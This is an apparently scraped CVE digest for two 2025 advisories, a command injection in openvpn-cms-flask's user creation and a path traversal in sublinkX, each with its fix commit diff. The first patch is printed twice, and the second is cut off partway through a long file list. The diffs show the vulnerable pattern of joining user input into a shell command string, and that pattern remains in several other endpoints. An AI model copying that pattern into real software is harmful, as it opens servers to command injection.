From: =?UTF-8?q?=E8=82=96=E8=BF=90=E6=9D=B0?= <Browser_hot@163.com>
Date: Fri, 6 Jun 2025 16:42:47 +0800
Subject: [PATCH] Fix the vulnerability

---
 Dockerfile                        |  1 +
 Makefile                          |  4 ++--
 app/api/v1/openvpn.py             | 14 ++++++--------
 app/config/secure.py              |  1 +
 app/libs/shell.py                 | 10 +++++++++-
 app/plugins/oss/app/controller.py |  4 ++++
 app/validators/forms.py           |  5 +++--
 7 files changed, 26 insertions(+), 13 deletions(-)

diff --git a/Dockerfile b/Dockerfile
index c3ebc67..39365fc 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -21,6 +21,7 @@ RUN cp -r /opt/openvpn-cms-flask/bin/*  /usr/local/bin/  \
 
 # python
 RUN set -ex \
+    && yum makecache \
     && yum install -y gcc GeoIP GeoIP-devel net-tools  \
     && pip3 install --no-cache-dir -r requirements.txt  -i https://pypi.tuna.tsinghua.edu.cn/simple \
     && sed -i s/localhost/mysql/g  /opt/openvpn-cms-flask/app/config/secure.py
diff --git a/Makefile b/Makefile
index cc88751..17517b6 100644
--- a/Makefile
+++ b/Makefile
@@ -8,9 +8,9 @@
 all: build push
 
 build:
-	docker build --pull --platform linux/amd64 -t registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.7 .
+	docker build --pull --platform linux/amd64 -t registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.8 .
 
 push:
-	docker push registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.7
+	docker push registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.8
 
 .PHONY: all build push
diff --git a/app/api/v1/openvpn.py b/app/api/v1/openvpn.py
index 6f23ad5..5734a22 100644
--- a/app/api/v1/openvpn.py
+++ b/app/api/v1/openvpn.py
@@ -38,9 +38,7 @@ def create_user():
     form = CreateUserForm().validate_for_api()
     result = OpenVPNUser.new_user(form)
     if result is True:
-        command = ["/usr/local/bin/vpnuser", "add", form.username.data]
-        command = ' '.join(str(d) for d in command)
-        remote_server.onetime_shell(command)
+        remote_server.param_shell(form.username.data)
         return Success(msg='用户创建成功')
 
 
@@ -76,7 +74,7 @@ def delete_openvpnuser():
     if result is True:
         command = ["/usr/local/bin/vpnuser", "del", form.username.data]
         command = ' '.join(str(d) for d in command)
-        remote_server.onetime_shell(command)
+        remote_server.remote_shell(command)
         return Success(msg='注销成功')
 
 
@@ -88,7 +86,7 @@ def update_mac():
     form = UserSearchForm().validate_for_api()
     command = ["/usr/local/bin/update_macaddress.sh", form.openvpn_user_info.data]
     command = ' '.join(str(d) for d in command)
-    value = remote_server.onetime_shell(command)
+    value = remote_server.remote_shell(command)
     if re.findall(r'已更新', value):
         return Success(msg='MAC address updated successfully')
     else:
@@ -127,7 +125,7 @@ def get_user_ip():
     form = UserSearchForm().validate_for_api()
     command = ["/usr/local/bin/get_user_ip.sh", form.openvpn_user_info.data]
     command = ' '.join(str(d) for d in command)
-    value = remote_server.onetime_shell(command)
+    value = remote_server.remote_shell(command)
     if re.findall('未注册', value):
         return ParameterException(msg='未注册')
     elif re.findall('未登入', value):
@@ -144,7 +142,7 @@ def get_ip_user():
     form = IPSearchForm().validate_for_api()
     command = ["/usr/local/bin/get_user_ip.sh", form.openvpn_ip.data]
     command = ' '.join(str(d) for d in command)
-    value = remote_server.onetime_shell(command)
+    value = remote_server.remote_shell(command)
     if re.findall('没有', value):
         raise ParameterException(msg='Unregistered')
     else:
@@ -157,7 +155,7 @@ def get_ip_user():
 @login_required
 # @login_required
 def arp_binding():
-    remote_server.onetime_shell("/bin/bash /usr/local/bin/add_arp.sh")
+    remote_server.remote_shell("/bin/bash /usr/local/bin/add_arp.sh")
     return Success(msg="arp绑定成功")
 
 
diff --git a/app/config/secure.py b/app/config/secure.py
index 6aa67ad..23b3044 100644
--- a/app/config/secure.py
+++ b/app/config/secure.py
@@ -34,6 +34,7 @@ class ProductionSecure(BaseConfig):
 
     SECRET_KEY = '\x88W\xf09\x91\x07\x98\x89\x87\x96\xa0A\xc68\xf9\xecJJU\x17\xc5V\xbe\x8b\xef\xd7\xd8\xd3\xe6\x95*4'
 
+
 """
     :初始参数设置
     :vpn服务器地址 VPN_ADDRESS
diff --git a/app/libs/shell.py b/app/libs/shell.py
index 31b1c59..5d49276 100644
--- a/app/libs/shell.py
+++ b/app/libs/shell.py
@@ -18,6 +18,12 @@ def onetime_shell(self, cmd):
         cmd = cmd[0].decode().rstrip()
         return cmd
 
+    def param_shell(self, username):
+        cmd = subprocess.run(["/usr/local/bin/vpnuser", "add", username],
+                             capture_output=True,
+                             text=True,
+                             check=True)
+        return cmd.stdout
 
 class Remote_cmd(object):
 
@@ -30,5 +36,7 @@ def onetime_shell(self, cmd, notice=False):
         stdin, stdout, stderr = self.ssh.exec_command(cmd)
         result = stdout.read().decode('utf-8').rstrip()
         if notice:
-           self.ssh.close()
+            self.ssh.close()
         return result
+
+
diff --git a/app/plugins/oss/app/controller.py b/app/plugins/oss/app/controller.py
index f1dfeed..192de0c 100644
--- a/app/plugins/oss/app/controller.py
+++ b/app/plugins/oss/app/controller.py
@@ -7,11 +7,13 @@
 from lin.db import db
 from lin.redprint import Redprint
 from lin.core import lin_config
+from lin import login_required
 
 api = Redprint('oss')
 
 
 @api.route('/upload_to_local', methods=['POST'])
+@login_required
 def upload():
     image = request.files.get('image', None)
     if not image:
@@ -25,6 +27,7 @@ def upload():
 
 
 @api.route('/upload_to_ali', methods=['POST'])
+@login_required
 def upload_to_ali():
     image = request.files.get('image', None)
     if not image:
@@ -52,6 +55,7 @@ def upload_to_ali():
 
 
 @api.route('/upload_multiple', methods=['POST'])
+@login_required
 def upload_multiple_to_ali():
     imgs = []
     for item in request.files:
diff --git a/app/validators/forms.py b/app/validators/forms.py
index 0b61b85..5022c64 100644
--- a/app/validators/forms.py
+++ b/app/validators/forms.py
@@ -168,8 +168,9 @@ class UserSearchForm(Form):
 
 class CreateUserForm(Form):
     username = StringField(
-        validators=[DataRequired(message='必须传入用户名'), length(min=1, max=20, message='用户名长度必须在1~20之间')])
-    # nickname = StringField(validators=[DataRequired(message='必须传入姓名昵称'),length(min=2, max=20, message='用户名长度必须在2~20之间')])
+        validators=[DataRequired(message='必须传入用户名'),
+                    Regexp(r'^[A-Za-z0-9_*&$#@]{6,22}$', message='密码长度必须在6~22位之间，包含字符、数字和 _ '),
+                    length(min=6, max=22, message='用户名长度必须在1~22之间')])
     nickname = StringField(validators=[length(max=20, message='用户名长度不能超过20')])
     summary = StringField(validators=[length(max=1000, message='备注信息不能超过1000')])
 


================================================================================


CVE ID: CVE-2025-6775
Published: 2025-06-27T20:15:35.750
Modified: 2025-06-30T18:38:23.493
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Description:
A vulnerability classified as critical has been found in xiaoyunjie openvpn-cms-flask up to 1.2.7. This affects the function create_user of the file /app/api/v1/openvpn.py of the component User Creation Endpoint. The manipulation of the argument Username leads to command injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 1.2.8 is able to address this issue. The patch is named e23559b98c8ea2957f09978c29f4e512ba789eb6. It is recommended to upgrade the affected component.

References (7):
  1. https://github.com/xiaoyunjie/openvpn-cms-flask/commit/e23559b98c8ea2957f09978c29f4e512ba789eb6
  2. https://github.com/xiaoyunjie/openvpn-cms-flask/issues/24
  3. https://github.com/xiaoyunjie/openvpn-cms-flask/issues/24#issuecomment-2948563464
  4. https://github.com/xiaoyunjie/openvpn-cms-flask/releases/tag/v1.2.8
  5. https://vuldb.com/?ctiid.314091
  6. https://vuldb.com/?id.314091
  7. https://vuldb.com/?submit.602373

Attempting to extract code examples from references...

--- Code from https://github.com/xiaoyunjie/openvpn-cms-flask/commit/e23559b98c8ea2957f09978c29f4e512ba789eb6 ---
From e23559b98c8ea2957f09978c29f4e512ba789eb6 Mon Sep 17 00:00:00 2001
From: =?UTF-8?q?=E8=82=96=E8=BF=90=E6=9D=B0?= <Browser_hot@163.com>
Date: Fri, 6 Jun 2025 16:42:47 +0800
Subject: [PATCH] Fix the vulnerability

---
 Dockerfile                        |  1 +
 Makefile                          |  4 ++--
 app/api/v1/openvpn.py             | 14 ++++++--------
 app/config/secure.py              |  1 +
 app/libs/shell.py                 | 10 +++++++++-
 app/plugins/oss/app/controller.py |  4 ++++
 app/validators/forms.py           |  5 +++--
 7 files changed, 26 insertions(+), 13 deletions(-)

diff --git a/Dockerfile b/Dockerfile
index c3ebc67..39365fc 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -21,6 +21,7 @@ RUN cp -r /opt/openvpn-cms-flask/bin/*  /usr/local/bin/  \
 
 # python
 RUN set -ex \
+    && yum makecache \
     && yum install -y gcc GeoIP GeoIP-devel net-tools  \
     && pip3 install --no-cache-dir -r requirements.txt  -i https://pypi.tuna.tsinghua.edu.cn/simple \
     && sed -i s/localhost/mysql/g  /opt/openvpn-cms-flask/app/config/secure.py
diff --git a/Makefile b/Makefile
index cc88751..17517b6 100644
--- a/Makefile
+++ b/Makefile
@@ -8,9 +8,9 @@
 all: build push
 
 build:
-	docker build --pull --platform linux/amd64 -t registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.7 .
+	docker build --pull --platform linux/amd64 -t registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.8 .
 
 push:
-	docker push registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.7
+	docker push registry.cn-hangzhou.aliyuncs.com/browser/openvpn-cms-flask:v1.2.8
 
 .PHONY: all build push
diff --git a/app/api/v1/openvpn.py b/app/api/v1/openvpn.py
index 6f23ad5..5734a22 100644
--- a/app/api/v1/openvpn.py
+++ b/app/api/v1/openvpn.py
@@ -38,9 +38,7 @@ def create_user():
     form = CreateUserForm().validate_for_api()
     result = OpenVPNUser.new_user(form)
     if result is True:
-        command = ["/usr/local/bin/vpnuser", "add", form.username.data]
-        command = ' '.join(str(d) for d in command)
-        remote_server.onetime_shell(command)
+        remote_server.param_shell(form.username.data)
         return Success(msg='用户创建成功')
 
 
@@ -76,7 +74,7 @@ def delete_openvpnuser():
     if result is True:
         command = ["/usr/local/bin/vpnuser", "del", form.username.data]
         command = ' '.join(str(d) for d in command)
-        remote_server.onetime_shell(command)
+        remote_server.remote_shell(command)
         return Success(msg='注销成功')
 
 
@@ -88,7 +86,7 @@ def update_mac():
     form = UserSearchForm().validate_for_api()
     command = ["/usr/local/bin/update_macaddress.sh", form.openvpn_user_info.data]
     command = ' '.join(str(d) for d in command)
-    value = remote_server.onetime_shell(command)
+    value = remote_server.remote_shell(command)
     if re.findall(r'已更新', value):
         return Success(msg='MAC address updated successfully')
     else:
@@ -127,7 +125,7 @@ def get_user_ip():
     form = UserSearchForm().validate_for_api()
     command = ["/usr/local/bin/get_user_ip.sh", form.openvpn_user_info.data]
     command = ' '.join(str(d) for d in command)
-    value = remote_server.onetime_shell(command)
+    value = remote_server.remote_shell(command)
     if re.findall('未注册', value):
         return ParameterException(msg='未注册')
     elif re.findall('未登入', value):
@@ -144,7 +142,7 @@ def get_ip_user():
     form = IPSearchForm().validate_for_api()
     command = ["/usr/local/bin/get_user_ip.sh", form.openvpn_ip.data]
     command = ' '.join(str(d) for d in command)
-    value = remote_server.onetime_shell(command)
+    value = remote_server.remote_shell(command)
     if re.findall('没有', value):
         raise ParameterException(msg='Unregistered')
     else:
@@ -157,7 +155,7 @@ def get_ip_user():
 @login_required
 # @login_required
 def arp_binding():
-    remote_server.onetime_shell("/bin/bash /usr/local/bin/add_arp.sh")
+    remote_server.remote_shell("/bin/bash /usr/local/bin/add_arp.sh")
     return Success(msg="arp绑定成功")
 
 
diff --git a/app/config/secure.py b/app/config/secure.py
index 6aa67ad..23b3044 100644
--- a/app/config/secure.py
+++ b/app/config/secure.py
@@ -34,6 +34,7 @@ class ProductionSecure(BaseConfig):
 
     SECRET_KEY = '\x88W\xf09\x91\x07\x98\x89\x87\x96\xa0A\xc68\xf9\xecJJU\x17\xc5V\xbe\x8b\xef\xd7\xd8\xd3\xe6\x95*4'
 
+
 """
     :初始参数设置
     :vpn服务器地址 VPN_ADDRESS
diff --git a/app/libs/shell.py b/app/libs/shell.py
index 31b1c59..5d49276 100644
--- a/app/libs/shell.py
+++ b/app/libs/shell.py
@@ -18,6 +18,12 @@ def onetime_shell(self, cmd):
         cmd = cmd[0].decode().rstrip()
         return cmd
 
+    def param_shell(self, username):
+        cmd = subprocess.run(["/usr/local/bin/vpnuser", "add", username],
+                             capture_output=True,
+                             text=True,
+                             check=True)
+        return cmd.stdout
 
 class Remote_cmd(object):
 
@@ -30,5 +36,7 @@ def onetime_shell(self, cmd, notice=False):
         stdin, stdout, stderr = self.ssh.exec_command(cmd)
         result = stdout.read().decode('utf-8').rstrip()
         if notice:
-           self.ssh.close()
+            self.ssh.close()
         return result
+
+
diff --git a/app/plugins/oss/app/controller.py b/app/plugins/oss/app/controller.py
index f1dfeed..192de0c 100644
--- a/app/plugins/oss/app/controller.py
+++ b/app/plugins/oss/app/controller.py
@@ -7,11 +7,13 @@
 from lin.db import db
 from lin.redprint import Redprint
 from lin.core import lin_config
+from lin import login_required
 
 api = Redprint('oss')
 
 
 @api.route('/upload_to_local', methods=['POST'])
+@login_required
 def upload():
     image = request.files.get('image', None)
     if not image:
@@ -25,6 +27,7 @@ def upload():
 
 
 @api.route('/upload_to_ali', methods=['POST'])
+@login_required
 def upload_to_ali():
     image = request.files.get('image', None)
     if not image:
@@ -52,6 +55,7 @@ def upload_to_ali():
 
 
 @api.route('/upload_multiple', methods=['POST'])
+@login_required
 def upload_multiple_to_ali():
     imgs = []
     for item in request.files:
diff --git a/app/validators/forms.py b/app/validators/forms.py
index 0b61b85..5022c64 100644
--- a/app/validators/forms.py
+++ b/app/validators/forms.py
@@ -168,8 +168,9 @@ class UserSearchForm(Form):
 
 class CreateUserForm(Form):
     username = StringField(
-        validators=[DataRequired(message='必须传入用户名'), length(min=1, max=20, message='用户名长度必须在1~20之间')])
-    # nickname = StringField(validators=[DataRequired(message='必须传入姓名昵称'),length(min=2, max=20, message='用户名长度必须在2~20之间')])
+        validators=[DataRequired(message='必须传入用户名'),
+                    Regexp(r'^[A-Za-z0-9_*&$#@]{6,22}$', message='密码长度必须在6~22位之间，包含字符、数字和 _ '),
+                    length(min=6, max=22, message='用户名长度必须在1~22之间')])
     nickname = StringField(validators=[length(max=20, message='用户名长度不能超过20')])
     summary = StringField(validators=[length(max=1000, message='备注信息不能超过1000')])
 


================================================================================


CVE ID: CVE-2025-6774
Published: 2025-06-27T20:15:35.510
Modified: 2025-06-30T18:38:23.493
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability was found in gooaclok819 sublinkX up to 1.8. It has been rated as critical. Affected by this issue is the function AddTemp of the file api/template.go. The manipulation of the argument filename leads to path traversal. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 1.9 is able to address this issue. The patch is identified as 778d26aef723daa58df98c8060c43f5bf5d1b10b. It is recommended to upgrade the affected component.

References (7):
  1. https://github.com/gooaclok819/sublinkX/commit/778d26aef723daa58df98c8060c43f5bf5d1b10b
  2. https://github.com/gooaclok819/sublinkX/issues/68#issuecomment-2957290524
  3. https://github.com/gooaclok819/sublinkX/issues/69
  4. https://github.com/gooaclok819/sublinkX/releases/tag/1.9
  5. https://vuldb.com/?ctiid.314090
  6. https://vuldb.com/?id.314090
  7. https://vuldb.com/?submit.602369

Attempting to extract code examples from references...

--- Code from https://github.com/gooaclok819/sublinkX/commit/778d26aef723daa58df98c8060c43f5bf5d1b10b ---
From 778d26aef723daa58df98c8060c43f5bf5d1b10b Mon Sep 17 00:00:00 2001
From: gooaclok819 <gooaclok819@gmail.com>
Date: Tue, 10 Jun 2025 05:08:02 +0800
Subject: [PATCH] 1.9

---
 .github/workflows/docker-image.yml            |  40 --
 .gitignore                                    |   3 +-
 README.en-US.md                               |  11 +-
 README.md                                     |  14 +-
 api/auth.go                                   |  10 +-
 api/clients.go                                |   6 +-
 api/node.go                                   |   6 +-
 api/sub.go                                    | 126 +++--
 api/user.go                                   |   4 +-
 build.sh                                      |   3 +-
 demo.sh                                       |   4 -
 install.sh                                    | 454 ++++++++++++++++--
 main.go                                       |  12 +-
 menu.sh                                       | 166 -------
 middlewares/jwt.go                            |   6 +-
 models/config.go                              |  88 +++-
 models/subcription.go                         | 145 ++++--
 node/clash.go                                 |   2 +-
 routers/user.go                               |   2 +-
 static/css/el-alert.B9oGCRyi.css              |   1 -
 static/css/el-alert.G57rL0jl.css              |   1 +
 static/css/el-dialog.Cop0q8z2.css             |   1 +
 static/css/el-dialog.DCGCHX2q.css             |   1 -
 static/css/el-form-item.BqrJjMte.css          |   1 +
 static/css/el-form-item.uSAh9oyp.css          |   1 -
 static/css/el-image-viewer.BJ_nFYFt.css       |   1 -
 static/css/el-image-viewer.gjGgbSV7.css       |   1 +
 static/css/el-link.B58a4a3I.css               |   1 +
 static/css/el-link.Dkj8bMmD.css               |   1 -
 ...ct.BaQA8IKP.css => el-select.CvzM3W2w.css} |   2 +-
 static/css/el-table-column.BfJ1jZWA.css       |   1 -
 static/css/el-table-column.DICiW8BK.css       |   1 +
 static/css/el-tabs.BURcj4qt.css               |   1 -
 static/css/el-tabs.BihFZC1O.css               |   1 +
 ...{index.CJKN3zBj.css => index.BlP5mz1q.css} |   2 +-
 static/css/index.C4eKYwfq.css                 |   1 +
 static/css/index.DZhVAj3G.css                 |   1 -
 .../{node.wSVBx8Lp.css => node.BTLfVIp4.css}  |   2 +-
 static/css/set.BBN4KMaE.css                   |   1 +
 static/css/set.BMjHnBvk.css                   |   1 -
 static/css/subs.B8TH4pkl.css                  |   1 +
 static/css/subs.JwB3fIbV.css                  |   1 -
 static/index.html                             |   4 +-
 static/js/401.2cRCE_5G.js                     |   1 -
 static/js/401.A8ivxQe-.js                     |   1 +
 .../js/{404.DlqBpkU7.js => 404.oOGe90N9.js}   |   2 +-
 static/js/BarChart.BhtXtCgr.js                |   1 -
 static/js/BarChart.oxEucXyN.js                |   1 +
 ...rt.L2tIbyMX.js => FunnelChart.DNDcYTtE.js} |   2 +-
 static/js/PieChart.BqKF5xSm.js                |   1 +
 static/js/PieChart.mgwtBU-p.js                |   1 -
 static/js/RadarChart.DbQwq7oR.js              |   1 +
 static/js/RadarChart.TGxAW552.js              |   1 -
 ...8iq1wq.js => _initCloneObject.CdEb-nKU.js} |   2 +-
 ...{apifox.IXUmMSaC.js => apifox.CYnsXVba.js} |   2 +-
 ...rray.BN0gQOTw.js => castArray.Bz5-nP3Z.js} |   2 +-
 ...ounce.i1DMUZzi.js => debounce.Dto-6gXK.js} |   2 +-
 static/js/dict.B6ktMwQ2.js                    |   1 -
 static/js/dict.BSgFWhK7.js                    |   1 +
 static/js/dropdown.C8ii2HAP.js                |   1 +
 static/js/dropdown.CqG_2FXV.js                |   1 -
 static/js/el-alert.C4kfmMUd.js                |   1 +
 static/js/el-alert.IAJrxUBM.js                |   1 -
 static/js/el-card.BtD6lis4.js                 |   1 +
 static/js/el-card.DWbysKpS.js                 |   1 -
 static/js/el-col.CSFVcDlT.js                  |   1 +
 static/js/el-col.DNKSa6YX.js                  |   1 -
 static/js/el-dialog.BgwkivRZ.js               |   1 +
 static/js/el-dialog.Dis4ipFy.js               |   1 -
 static/js/el-form-item.BmzvT5P_.js            |   1 +
 static/js/el-form-item.UpoTeuOf.js            |   1 -
 static/js/el-image-viewer.BFbI4qeV.js         |   1 +
 static/js/el-image-viewer.Ck07Xbtu.js         |   1 -
 static/js/el-link.BTv-HaC_.js                 |   1 -
 static/js/el-link.Dy3TrIP0.js                 |   1 +
 static/js/el-popper.BOk2pAjG.js               |   1 +
 static/js/el-popper.e9kr8u9Q.js               |   1 -
 static/js/el-scrollbar.BWFBt2l1.js            |   1 +
 static/js/el-scrollbar.DlPh6Z7D.js            |   1 -
 static/js/el-select.dUFpYm6H.js               |   1 -
 static/js/el-select.ig4666ag.js               |   1 +
 static/js/el-switch.C2enjB5d.js               |   1 +
 static/js/el-switch.zYake_dz.js               |   1 -
 static/js/el-table-column.B8f3rlJz.js         |   1 +
 static/js/el-table-column.haX2jq5s.js         |   1 -
 static/js/el-tabs.C9qKjW-L.js                 |   1 +
 static/js/el-tabs.DDmXOrX8.js                 |   1 -
 static/js/el-tag.CLWce1kX.js                  |   1 -
 static/js/el-tag.dVQ_5BVp.js                  |   1 +
 static/js/icon-selector.B8xqxj5a.js           |   1 -
 static/js/icon-selector.BDDDRxZx.js           |   1 +
 static/js/icons.CLwEP9y6.js                   |   1 +
 static/js/icons.DgB57Xkx.js                   |   1 -
 static/js/index.9PHSMUIB.js                   |   2 -
 static/js/index.9UoVjQ1v.js                   |   1 -
 static/js/index.B2Hg7VBR.js                   |   1 -
 static/js/index.BB3n5hnY.js                   |   1 +
 static/js/index.BBNS_uLM.js                   |   1 -
 static/js/index.BEs2tgIy.js                   |   1 +
 static/js/index.BTVf4LI1.js                   |   1 +
 static/js/index.BfcEpzPY.js                   |   1 -
 static/js/index.BrHL87wj.js                   |   1 -
 static/js/index.BrmtYoMG.js                   |   1 +
 static/js/index.C4hOZ5W6.js                   |   1 +
 .../{index.CM09xEA_.js => index.COwZ25X4.js}  |   2 +-
 static/js/index.CULjW3Hk.js                   |   1 +
 static/js/index.CnrCGsB5.js                   |   1 +
 static/js/index.D5Q7nPxR.js                   |   1 +
 static/js/index.D6nSmJHY.js                   |   1 -
 static/js/index.D7zGuEZp.js                   |   1 -
 static/js/index.DNYq9Wso.js                   |   1 -
 static/js/index.DQt7LRo_.js                   |   2 +
 static/js/index.DpZd_Lnx.js                   |   1 +
 static/js/internal-doc.B6eN2GGk.js            |   1 -
 static/js/internal-doc.BtqR0xRB.js            |   1 +
 ...sEqual.DDyRMzJ4.js => isEqual.CRCpD0bX.js} |   2 +-
 static/js/isUndefined.DgmxjSXK.js             |   1 -
 static/js/knife4j.C3XegEf8.js                 |   1 -
 static/js/knife4j.DpzuQMf0.js                 |   1 +
 static/js/level1.DbJgCAxV.js                  |   1 -
 static/js/level1.oGeow6KW.js                  |   1 +
 static/js/level2.CXm5yCsd.js                  |   1 -
 static/js/level2.VmkE7n-X.js                  |   1 +
 static/js/level3-1.BUUzsNUz.js                |   1 +
 static/js/level3-1.veb2CjDd.js                |   1 -
 static/js/level3-2.DzCkFumo.js                |   1 +
 static/js/level3-2.ehpMX2NG.js                |   1 -
 static/js/node.B7CBv-vw.js                    |   1 -
 static/js/node.Dac5foo2.js                    |   1 +
 static/js/nodes.BvTKFj9V.js                   |   1 -
 static/js/nodes.DWWjcAer.js                   |   1 +
 ...ition.CopxYfyp.js => position.DlWUUiGS.js} |   2 +-
 static/js/refs.CNClepWF.js                    |   1 -
 static/js/refs.DfdxW6x2.js                    |   1 +
 static/js/set.DCph2DiX.js                     |   1 -
 static/js/set.D_ZTs_bD.js                     |   1 +
 static/js/signature.5Hv-l5jE.js               |   1 -
 static/js/signature.BnAs3F8Q.js               |   1 +
 ...trings.CQ_np2th.js => strings.CUsguf90.js} |   2 +-
 static/js/subs.1dXoageE.js                    |   1 -
 static/js/subs.CUOV2WbQ.js                    |   1 +
 ...wagger.BGskywol.js => swagger.CSJ9B_PJ.js} |   2 +-
 .../js/{temp.gJIG3-Be.js => temp.DAKXAXN0.js} |   2 +-
 static/js/template.C1Fhr0SI.js                |   1 +
 static/js/template.iDasYWHy.js                |   1 -
 static/js/upload.DkIgLQ_p.js                  |   1 -
 static/js/upload.Dn3W5VcS.js                  |   1 +
 static/js/use-dialog.CybRpRek.js              |   1 -
 static/js/use-dialog.DYJdXddk.js              |   1 +
 static/js/wang-editor.Cmb5yULV.js             |   1 +
 static/js/wang-editor.CovtB-Ke.js             |   1 -
 static/js/websocket.C8KDU47E.js               |   1 +
 static/js/websocket.YJwVKVlt.js               |   1 -
 sublink_win64.exe                             | Bin 0 -> 24410624 bytes
 utils/rand.go                                 |  21 +
 webs/package.json                             |   1 +
 webs/src/api/user/index.ts                    |  17 +-
 webs/src/views/subcription/subs.vue           |  50 ++
 webs/src/views/system/user/set.vue            |   8 +-
 159 files changed, 907 insertions(+), 446 deletions(-)
 delete mode 100644 .github/workflows/docker-image.yml
 delete mode 100644 demo.sh
 delete mode 100644 menu.sh
 delete mode 100644 static/css/el-alert.B9oGCRyi.css
 create mode 100644 static/css/el-alert.G57rL0jl.css
 create mode 100644 static/css/el-dialog.Cop0q8z2.css
 delete mode 100644 static/css/el-dialog.DCGCHX2q.css
 create mode 100644 static/css/el-form-item.BqrJjMte.css
 delete mode 100644 static/css/el-form-item.uSAh9oyp.css
 delete mode 100644 static/css/el-image-viewer.BJ_nFYFt.css
 create mode 100644 static/css/el-image-viewer.gjGgbSV7.css
 create mode 100644 static/css/el-link.B58a4a3I.css
 delete mode 100644 static/css/el-link.Dkj8bMmD.css
 rename static/css/{el-select.BaQA8IKP.css => el-select.CvzM3W2w.css} (60%)
 delete mode 100644 static/css/el-table-column.BfJ1jZWA.css
 create mode 100644 static/css/el-table-column.DICiW8BK.css
 delete mode 100644 static/css/el-tabs.BURcj4qt.css
 create mode 100644 static/css/el-tabs.BihFZC1O.css
 rename static/css/{index.CJKN3zBj.css => index.BlP5mz1q.css} (63%)
 create mode 100644 static/css/index.C4eKYwfq.css
 delete mode 100644 static/css/index.DZhVAj3G.css
 rename static/css/{node.wSVBx8Lp.css => node.BTLfVIp4.css} (84%)
 create mode 100644 static/css/set.BBN4KMaE.css
 delete mode 100644 static/css/set.BMjHnBvk.css
 create mode 100644 static/css/subs.B8TH4pkl.css
 delete mode 100644 static/css/subs.JwB3fIbV.css
 delete mode 100644 static/js/401.2cRCE_5G.js
 create mode 100644 static/js/401.A8ivxQe-.js
 rename static/js/{404.DlqBpkU7.js => 404.oOGe90N9.js} (88%)
 delete mode 100644 static/js/BarChart.BhtXtCgr.js
 create mode 100644 static/js/BarChart.oxEucXyN.js
 rename static/js/{FunnelChart.L2tIbyMX.js => FunnelChart.DNDcYTtE.js} (76%)
 create mode 100644 static/js/PieChart.BqKF5xSm.js
 delete mode 100644 static/js/PieChart.mgwtBU-p.js
 create mode 100644 static/js/RadarChart.DbQwq7oR.js
 delete mode 100644 static/js/RadarChart.TGxAW552.js
 rename static/js/{_initCloneObject.cf8iq1wq.js => _initCloneObject.CdEb-nKU.js} (60%)
 rename static/js/{apifox.IXUmMSaC.js => apifox.CYnsXVba.js} (54%)
 rename static/js/{castArray.BN0gQOTw.js => castArray.Bz5-nP3Z.js} (53%)
 rename static/js/{debounce.i1DMUZzi.js => debounce.Dto-6gXK.js} (95%)
 delete mode 100644 static/js/dict.B6ktMwQ2.js
 create mode 100644 static/js/dict.BSgFWhK7.js
 create mode 100644 static/js/dropdown.C8ii2HAP.js
 delete mode 100644 static/js/dropdown.CqG_2FXV.js
 create mode 100644 static/js/el-alert.C4kfmMUd.js
 delete mode 100644 static/js/el-alert.IAJrxUBM.js
 create mode 100644 static/js/el-card.BtD6lis4.js
 delete mode 100644 static/js/el-card.DWbysKpS.js
 create mode 100644 static/js/el-col.CSFVcDlT.js
 delete mode 100644 static/js/el-col.DNKSa6YX.js
 create mode 100644 static/js/el-dialog.BgwkivRZ.js
 delete mode 100644 static/js/el-dialog.Dis4ipFy.js
 create mode 100644 static/js/el-form-item.BmzvT5P_.js
 delete mode 100644 static/js/el-form-item.UpoTeuOf.js
 create mode 100644 static/js/el-image-viewer.BFbI4qeV.js
 delete mode 100644 static/js/el-image-viewer.Ck07Xbtu.js
 delete mode 100644 static/js/el-link.BTv-HaC_.js
 create mode 100644 static/js/el-link.Dy3TrIP0.js
 create mode 100644 static/js/el-popper.BOk2pAjG.js
 delete mode 100644 static/js/el-popper.e9kr8u9Q.js
 create mode 100644 static/js/el-scrollbar.BWFBt2l1.js
 delete mode 100644 static/js/el-scrollbar.DlPh6Z7D.js
 delete mode 100644 static/js/el-select.dUFpYm6H.js
 create mode 100644 static/js/el-select.ig4666ag.js
 create mode 100644 static/js/el-switch.C2enjB5d.js
 delete mode 100644 static/js/el-switch.zYake_dz.js
 create mode 100644 static/js/el-table-column.B8f3rlJz.js
 delete mode 100644 static/js/el-table-column.haX2jq5s.js
 create mode 100644 static/js/el-tabs.C9qKjW-L.js
 delete mode 100644 static/js/el-tabs.DDmXOrX8.js
 delete mode 100644 static/js/el-tag.CLWce1kX.js
 create mode 100644 static/js/el-tag.dVQ_5BVp.js
 delete mode 100644 static/js/icon-selector.B8xqxj5a.js
 create mode 100644 static/js/icon-selector.BDDDRxZx.js
 create mode 100644 static/js/icons.CLwEP9y6.js
 delete mode 100644 static/js/icons.DgB57Xkx.js
 delete mode 100644 static/js/index.9PHSMUIB.js
 delete mode 100644 static/js/index.9UoVjQ1v.js
 delete mode 100644 static/js/index.B2Hg7VBR.js
 create mode 100644 static/js/index.BB3n5hnY.js
 delete mode 100644 static/js/index.BBNS_uLM.js
 create mode 100644 static/js/index.BEs2tgIy.js
 create mode 100644 static/js/index.BTVf4LI1.js
 delete mode 100644 static/js/index.BfcEpzPY.js
 delete mode 100644 static/js/index.BrHL87wj.js
 create mode 100644 static/js/index.BrmtYoMG.js
